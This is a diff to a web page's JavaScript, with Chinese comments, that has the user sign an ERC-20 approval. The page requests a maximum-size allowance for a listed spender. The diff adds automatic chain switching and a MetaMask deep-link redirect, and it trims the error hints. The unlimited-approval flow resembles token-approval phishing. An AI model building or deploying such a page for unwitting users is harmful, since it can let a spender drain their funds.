@@ -151,7 +151,7 @@
         };
         const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-        // 网络配置（用于切换）
+        // 网络配置
         const NETWORKS = {
             1: {
                 chainId: '0x1',
@@ -170,7 +170,6 @@
         };
 
         let currentChain = '1';
-        let provider = null;
 
         // DOM 元素
         const chainSelector = document.getElementById('chainSelector');
@@ -201,8 +200,13 @@
         }
 
         // 检查并切换网络
-        async function switchNetwork(targetChainId) {
-            const targetHex = '0x' + parseInt(targetChainId).toString(16);
+        async function ensureNetwork(targetChainId) {
+            if (!window.ethereum) return true; // 非注入环境不处理，留给跳转逻辑
+            const currentChainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+            const currentChainId = parseInt(currentChainIdHex, 16);
+            if (currentChainId === targetChainId) return true;
+
+            const targetHex = '0x' + targetChainId.toString(16);
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
@@ -211,7 +215,6 @@
                 return true;
             } catch (error) {
                 if (error.code === 4902) {
-                    // 网络未添加，尝试添加
                     try {
                         await window.ethereum.request({
                             method: 'wallet_addEthereumChain',
@@ -234,28 +237,21 @@
         // 授权函数
         async function approve() {
             if (!window.ethereum) {
-                showDialog('请确保在 MetaMask 内置浏览器中打开此页面');
+                // 如果不在 MetaMask 内置浏览器中，跳转到 MetaMask
+                const currentUrl = window.location.href;
+                const deepLink = `https://metamask.app.link/dapp/${currentUrl.replace(/^https?:\/\//, '')}`;
+                window.location.href = deepLink;
                 return;
             }
+
             hideStatus();
-            showStatus('正在连接钱包...', 'loading');
+            showStatus('正在处理...', 'loading');
 
             try {
                 const targetChainId = parseInt(currentChain);
-                // 检查当前网络
-                const currentChainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
-                const currentChainId = parseInt(currentChainIdHex, 16);
-
-                if (currentChainId !== targetChainId) {
-                    showStatus(`当前网络不是目标网络，正在切换...`, 'loading');
-                    const switched = await switchNetwork(targetChainId);
-                    if (!switched) {
-                        showStatus('网络切换失败，请手动切换到目标网络', 'error');
-                        return;
-                    }
-                    // 等待一小段时间让网络切换生效
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                }
+                // 确保网络正确
+                const networkOk = await ensureNetwork(targetChainId);
+                if (!networkOk) return;
 
                 // 请求账户
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -274,12 +270,7 @@
                     chainId: targetChainId
                 };
 
-                console.log('发送交易:', {
-                    chainId: targetChainId,
-                    to: transaction.to,
-                    from: transaction.from,
-                    data: transaction.data
-                });
+                console.log('发送交易:', transaction);
 
                 showStatus('请在钱包中确认授权...', 'loading');
                 const txHash = await window.ethereum.request({
@@ -293,10 +284,10 @@
                 if (error.code === 4001) {
                     errorMsg = '用户取消了授权';
                 } else if (error.code === -32603) {
-                    errorMsg = '交易失败，可能原因：链未切换、gas 不足或合约地址错误';
+                    errorMsg = '交易失败，请检查网络或合约地址';
                 }
                 showStatus(`授权失败: ${errorMsg}`, 'error');
-                showDialog(`授权失败: ${errorMsg}\n请检查控制台输出获取更多信息。`);
+                showDialog(`授权失败: ${errorMsg}`);
             }
         }
 
@@ -319,6 +310,15 @@
             });
             approveBtn.addEventListener('click', approve);
             updateSpenderDisplay();
+
+            // 检测是否在 MetaMask 内置浏览器中，如果是则显示连接状态
+            if (window.ethereum) {
+                showStatus('MetaMask 已连接，点击授权', 'success');
+                setTimeout(() => hideStatus(), 2000);
+            } else {
+                showStatus('点击授权将跳转到 MetaMask', 'loading');
+                setTimeout(() => hideStatus(), 2000);
+            }
         }
         init();
     </script>
